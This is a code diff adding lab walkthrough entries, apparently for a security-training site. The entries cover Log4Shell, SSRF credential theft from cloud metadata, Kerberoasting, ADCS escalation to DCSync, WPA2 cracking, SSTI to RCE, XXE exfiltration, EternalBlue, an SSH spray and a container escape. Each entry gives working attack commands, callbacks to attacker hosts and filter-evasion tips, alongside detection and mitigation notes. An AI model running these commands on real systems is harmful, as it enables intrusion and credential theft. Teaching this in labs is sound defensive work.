@@ -846,6 +846,345 @@ export const WALKTHROUGHS: Walkthrough[] = [
     mitigationSummary:
       "Disable anonymous SMB, require signing, and use conditional access for file shares.",
   },
+  // ============================================================
+  // Extra scenarios (round-out pass)
+  // ============================================================
+  {
+    slug: "log4shell-lab",
+    title: "Log4Shell — safe reproduction in a lab",
+    scenario:
+      "Reproduce CVE-2021-44228 against a purpose-built vulnerable app and confirm the callback without shipping a payload.",
+    labSetup: "Docker image ghcr.io/christophetd/log4shell-vulnerable-app on an isolated bridge network.",
+    duration: "20 minutes",
+    difficulty: "beginner",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["curl", "nuclei"],
+    steps: [
+      {
+        title: "Stand up the vulnerable app",
+        narration: "One-shot Docker run — no ports exposed to the host beyond localhost.",
+        command: "docker run --rm -p 127.0.0.1:8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app",
+      },
+      {
+        title: "Start a DNS-only listener",
+        narration:
+          "Use an out-of-band interaction service (e.g. Interactsh) to receive the callback. DNS-only proves the injection without executing code.",
+        command: "interactsh-client -v",
+        expectedOutput: "[INF] Listing 1 URL for OOB Testing\n[INF] c1abcd.oast.pro",
+      },
+      {
+        title: "Trigger the log injection",
+        narration: "The vulnerable app logs the X-Api-Version header. JNDI:LDAP forces a lookup.",
+        command:
+          "curl 'http://127.0.0.1:8080/' -H 'X-Api-Version: ${jndi:ldap://c1abcd.oast.pro/x}'",
+        observation:
+          "In the interactsh terminal you should see a DNS interaction. That's enough to confirm exploitability — do NOT host an LDAP payload.",
+        branches: [
+          {
+            when: "No DNS callback arrives",
+            then:
+              "Confirm outbound DNS from the docker network. Try ${${lower:jndi}:ldap://...} to defeat simple string filters.",
+          },
+        ],
+      },
+    ],
+    successCriteria: "OOB DNS callback observed; no code executed.",
+    detectionSummary: "WAF signature for '${jndi:' patterns; outbound LDAP/DNS from JVMs.",
+    mitigationSummary: "Upgrade log4j >= 2.17.1; set -Dlog4j2.formatMsgNoLookups=true; egress-filter JVM hosts.",
+  },
+  {
+    slug: "ssrf-metadata",
+    title: "SSRF to cloud metadata (IMDSv1 lab)",
+    scenario:
+      "A lab image-fetching endpoint accepts arbitrary URLs. Show how it can be turned into credential theft against an IMDSv1 endpoint.",
+    labSetup: "LocalStack or a self-hosted mock that emulates 169.254.169.254 responses.",
+    duration: "25 minutes",
+    difficulty: "intermediate",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["curl", "ffuf"],
+    steps: [
+      {
+        title: "Confirm the fetch primitive",
+        narration: "Point the parameter at your own listener to prove it's a server-side fetch.",
+        command: "curl 'http://app.lab.local/fetch?url=http://attacker.lab.local:9000/probe'",
+        expectedOutput: '"content": "probe"',
+      },
+      {
+        title: "Pivot to the metadata endpoint",
+        narration: "IMDSv1 needs no headers. If the mock returns creds, IMDSv2 is not enforced.",
+        command:
+          "curl 'http://app.lab.local/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
+        expectedOutput: '"content": "lab-role"',
+      },
+      {
+        title: "Read the temp credentials",
+        command:
+          "curl 'http://app.lab.local/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-role'",
+        observation: "AccessKeyId / SecretAccessKey / Token — treat as sensitive even in a lab.",
+      },
+    ],
+    successCriteria: "Retrieved a role credential document via SSRF.",
+    detectionSummary: "Outbound requests from app servers to 169.254.169.254; unusual IAM API from EC2 role.",
+    mitigationSummary: "Enforce IMDSv2 (hop-limit=1, token required); block 169.254.169.254 at the app layer; use allow-lists for URL fetchers.",
+  },
+  {
+    slug: "kerberoast-lab",
+    title: "Kerberoasting an AD lab",
+    scenario:
+      "You have low-priv domain creds. Request TGS tickets for service accounts, then crack offline.",
+    labSetup: "GOAD or a home-lab AD forest; DC reachable at 10.10.0.10.",
+    duration: "45 minutes",
+    difficulty: "intermediate",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["impacket-getuserspns", "hashcat", "kerbrute"],
+    steps: [
+      {
+        title: "Enumerate valid users (optional)",
+        command: "kerbrute userenum -d lab.local --dc 10.10.0.10 seclists/usernames.txt",
+      },
+      {
+        title: "Request TGS for accounts with SPNs",
+        command:
+          "impacket-GetUserSPNs -request -dc-ip 10.10.0.10 lab.local/alice:'Winter2024!' -outputfile tgs.hash",
+        expectedOutput: "ServicePrincipalName  Name    MemberOf\nMSSQLSvc/sql01.lab...  svc_sql  ...",
+      },
+      {
+        title: "Crack offline",
+        command: "hashcat -m 13100 tgs.hash rockyou.txt -O",
+        observation: "Any cracked service account may lead to lateral movement or DA depending on group membership.",
+        branches: [
+          {
+            when: "No hashes cracked",
+            then: "Add best64.rule / OneRuleToRuleThemAll and keep the job running overnight.",
+          },
+        ],
+      },
+    ],
+    successCriteria: "At least one service-account plaintext password recovered in the lab.",
+    detectionSummary: "Volume of Kerberos TGS-REQ (event 4769) with RC4 encryption type from a single user.",
+    mitigationSummary: "Long random passwords / gMSAs for service accounts; disable RC4; monitor 4769 for RC4.",
+  },
+  {
+    slug: "adcs-esc1-lab",
+    title: "ADCS ESC1 — domain escalation via a vulnerable template",
+    scenario:
+      "Enumerate ADCS templates, find one that allows enrollee-supplied SANs, and request a cert as Domain Admin.",
+    labSetup: "GOAD (Game Of Active Directory) with the CA misconfigured for ESC1.",
+    duration: "30 minutes",
+    difficulty: "advanced",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["certipy", "impacket-secretsdump"],
+    steps: [
+      {
+        title: "Find vulnerable templates",
+        command:
+          "certipy-ad find -u alice@lab.local -p 'PW' -dc-ip 10.10.0.10 -vulnerable -stdout",
+      },
+      {
+        title: "Request a cert impersonating administrator",
+        command:
+          "certipy-ad req -u alice -p 'PW' -ca 'lab-CA' -template 'VulnTemplate' -upn administrator@lab.local",
+        expectedOutput: "[*] Got certificate with UPN 'administrator@lab.local'",
+      },
+      {
+        title: "Convert cert to NT hash (PKINIT)",
+        command: "certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.0.10",
+      },
+      {
+        title: "DCSync all",
+        command:
+          "impacket-secretsdump -hashes :aad3b4...:e19cc... administrator@10.10.0.10 -just-dc-ntlm",
+      },
+    ],
+    successCriteria: "Full domain hash dump.",
+    detectionSummary: "Certificate issuance events (4886/4887) for a template with SAN override; unusual PKINIT logons.",
+    mitigationSummary: "Remove enrollee-supplies-subject; require CA manager approval; audit templates with certipy-find.",
+  },
+  {
+    slug: "wpa2-handshake-hashcat",
+    title: "WPA2 handshake capture & offline crack",
+    scenario:
+      "Capture a 4-way handshake from your own AP, convert, and crack with hashcat.",
+    labSetup: "A WPA2 AP you own; USB Wi-Fi adapter with monitor mode.",
+    duration: "45 minutes",
+    difficulty: "intermediate",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["hcxdumptool", "hcxtools", "hashcat"],
+    steps: [
+      {
+        title: "Enable monitor mode",
+        command: "sudo airmon-ng check kill && sudo airmon-ng start wlan0",
+      },
+      {
+        title: "Capture with hcxdumptool",
+        command: "sudo hcxdumptool -i wlan0mon -o test.pcapng --enable_status=1",
+        observation: "Wait for a MSA (M1-M4) message or PMKID.",
+      },
+      {
+        title: "Convert",
+        command: "hcxpcapngtool -o crack.hc22000 test.pcapng",
+      },
+      {
+        title: "Crack",
+        command: "hashcat -m 22000 crack.hc22000 rockyou.txt -O",
+      },
+    ],
+    successCriteria: "Recovered your own AP's PSK in the lab.",
+    detectionSummary: "Deauth floods, unknown clients probing SSID lists.",
+    mitigationSummary: "Long random PSK, WPA3-SAE where possible, 802.11w for management-frame protection.",
+  },
+  {
+    slug: "ssti-jinja2",
+    title: "Server-side template injection (Jinja2)",
+    scenario: "Confirm SSTI in a Flask app and escalate to RCE via `__class__` chain.",
+    labSetup: "Vulnerable Flask app rendering user input via render_template_string().",
+    duration: "20 minutes",
+    difficulty: "intermediate",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["curl", "burpsuite-community"],
+    steps: [
+      { title: "Fingerprint the engine", command: "curl 'http://app.lab.local/?name={{7*7}}'", expectedOutput: "Hello 49" },
+      {
+        title: "Prove Python context",
+        command: "curl --data-urlencode 'name={{7*\"7\"}}' 'http://app.lab.local/'",
+        expectedOutput: "Hello 7777777",
+        observation: "String multiplication only exists in Python — confirms Jinja2/Python.",
+      },
+      {
+        title: "Reach the OS module",
+        command:
+          "curl --data-urlencode \"name={{ ''.__class__.__mro__[1].__subclasses__() }}\" 'http://app.lab.local/'",
+        observation: "Find the index of subprocess.Popen or os._wrap_close and pivot from there.",
+      },
+    ],
+    successCriteria: "RCE demonstrated as the Flask process user.",
+    detectionSummary: "Template-render errors with '__' access in logs; egress from the app to unusual hosts.",
+    mitigationSummary: "Never render user input as a template; use safe template rendering with autoescape and a strict sandbox.",
+  },
+  {
+    slug: "xxe-oob",
+    title: "XXE — out-of-band data exfiltration",
+    scenario:
+      "A lab endpoint parses XML with an old libxml2. Exfiltrate a local file via an OOB DTD.",
+    labSetup: "Container-hosted vulnerable SOAP endpoint; interactsh listener as OOB channel.",
+    duration: "25 minutes",
+    difficulty: "advanced",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["curl"],
+    steps: [
+      { title: "Host a malicious DTD",
+        narration: "Serve a DTD on your attacker box that reads /etc/hostname and beacons it back over HTTP.",
+        command: "python3 -m http.server 8000 --directory ./dtd" },
+      { title: "Send the XXE payload",
+        command:
+          "curl -H 'Content-Type: application/xml' --data @xxe.xml http://app.lab.local/api" },
+      { title: "Observe the callback with the filename encoded" },
+    ],
+    successCriteria: "OOB request received containing the file contents.",
+    detectionSummary: "XML parsers making outbound HTTP requests; unusual egress from app tier.",
+    mitigationSummary: "Disable external entity resolution in the parser (LIBXML_NONET, DTDLoader=null in Java).",
+  },
+  {
+    slug: "eternalblue-lab",
+    title: "EternalBlue — legacy lab reproduction",
+    scenario:
+      "Reproduce MS17-010 against an unpatched Windows 7 VM you own to understand the impact of unsegmented legacy systems.",
+    labSetup: "Isolated VM network, Windows 7 SP1 x64 unpatched, no bridge to production.",
+    duration: "20 minutes",
+    difficulty: "beginner",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["nmap", "metasploit-framework"],
+    steps: [
+      { title: "Detect", command: "nmap -p445 --script smb-vuln-ms17-010 10.10.10.20" },
+      { title: "Exploit in Metasploit",
+        command: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.20; run'",
+        expectedOutput: "[+] 10.10.10.20:445 - Meterpreter session 1 opened" },
+    ],
+    successCriteria: "SYSTEM shell on the lab VM.",
+    detectionSummary: "SMBv1 traffic + specific 'FEA' patterns; EDR signatures for EternalBlue.",
+    mitigationSummary: "Apply MS17-010, disable SMBv1, and segment legacy hosts.",
+  },
+  {
+    slug: "hydra-ssh-spray",
+    title: "SSH password spray with hydra (rate-limited)",
+    scenario:
+      "You have a small user list and one weak password guess from OSINT. Spray SSH low-and-slow to avoid lockout.",
+    labSetup: "Lab SSH host with a couple of weak accounts.",
+    duration: "10 minutes",
+    difficulty: "beginner",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["hydra"],
+    steps: [
+      { title: "Spray one password",
+        command: "hydra -L users.txt -p 'Winter2024!' -t 2 -W 5 ssh://10.10.10.30",
+        observation: "One thread, five-second wait to stay under fail2ban thresholds." },
+    ],
+    successCriteria: "Valid credential pair discovered without triggering lockout.",
+    detectionSummary: "Many failed logins for many users from a single source; fail2ban / SIEM correlation.",
+    mitigationSummary: "MFA, disable password auth, key-only + short-lived certificates.",
+  },
+  {
+    slug: "container-escape-privileged",
+    title: "Privileged-container escape (lab)",
+    scenario:
+      "You get RCE in a `--privileged` container. Escape to the host by mounting the host's root disk.",
+    labSetup: "A `docker run --privileged` container you control.",
+    duration: "15 minutes",
+    difficulty: "intermediate",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["nsenter"],
+    steps: [
+      { title: "Confirm privileged", command: "capsh --print | grep cap_sys_admin" },
+      { title: "Mount the host disk",
+        command: "mkdir /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host" },
+      { title: "Write a root-owned SSH key or scheduled task on the host — DO NOT do this outside your lab." },
+    ],
+    successCriteria: "Read/write access to host filesystem from inside the container.",
+    detectionSummary: "Falco rules on mount syscalls from containers; audit for --privileged flag in orchestration.",
+    mitigationSummary: "Never run --privileged; drop capabilities; use user namespaces; enforce PodSecurity / OPA.",
+  },
+  {
+    slug: "s3-public-bucket",
+    title: "Misconfigured S3 bucket triage",
+    scenario:
+      "A subdomain resolves to an S3 bucket. Confirm access levels without touching data you shouldn't.",
+    labSetup: "Your own bucket set to allow ListBucket for demo.",
+    duration: "10 minutes",
+    difficulty: "beginner",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["awscli"],
+    steps: [
+      { title: "Anonymous ls",
+        command: "aws s3 ls s3://lab-bucket --no-sign-request" },
+      { title: "Check bucket ACL",
+        command: "aws s3api get-bucket-acl --bucket lab-bucket --no-sign-request" },
+    ],
+    successCriteria: "Documented exact permissions granted to anonymous principals — no data downloaded.",
+    detectionSummary: "CloudTrail 'AnonymousUser' calls; unusual List/Get spikes.",
+    mitigationSummary: "Block Public Access at account level; least-privilege bucket policy; encryption + logging.",
+  },
+  {
+    slug: "burp-authz-test",
+    title: "Business-logic authorization test (IDOR / BOLA)",
+    scenario:
+      "Two lab accounts. Verify whether user A can view user B's data by tampering IDs.",
+    labSetup: "Any multi-tenant lab app with numeric object IDs.",
+    duration: "20 minutes",
+    difficulty: "beginner",
+    legalNote: LAB_NOTE,
+    toolSlugs: ["burpsuite-community"],
+    steps: [
+      { title: "Baseline as user A", command: "# capture GET /api/orders/1001 in Burp" },
+      { title: "Swap ID to user B's",
+        command: "# repeater: change 1001 -> 1002, resend",
+        observation: "200 with B's data == IDOR." },
+      { title: "Automate the sweep",
+        command: "ffuf -u 'http://app.lab.local/api/orders/FUZZ' -w ids.txt -H 'Cookie: session=A' -mc 200" },
+    ],
+    successCriteria: "Confirmed cross-tenant read with evidence and impact.",
+    detectionSummary: "One session enumerating consecutive IDs across owners.",
+    mitigationSummary: "Server-side authz check on every object read; use unguessable IDs; add rate limits.",
+  },
 ];
 
 export const walkthroughBySlug = (slug: string) =>
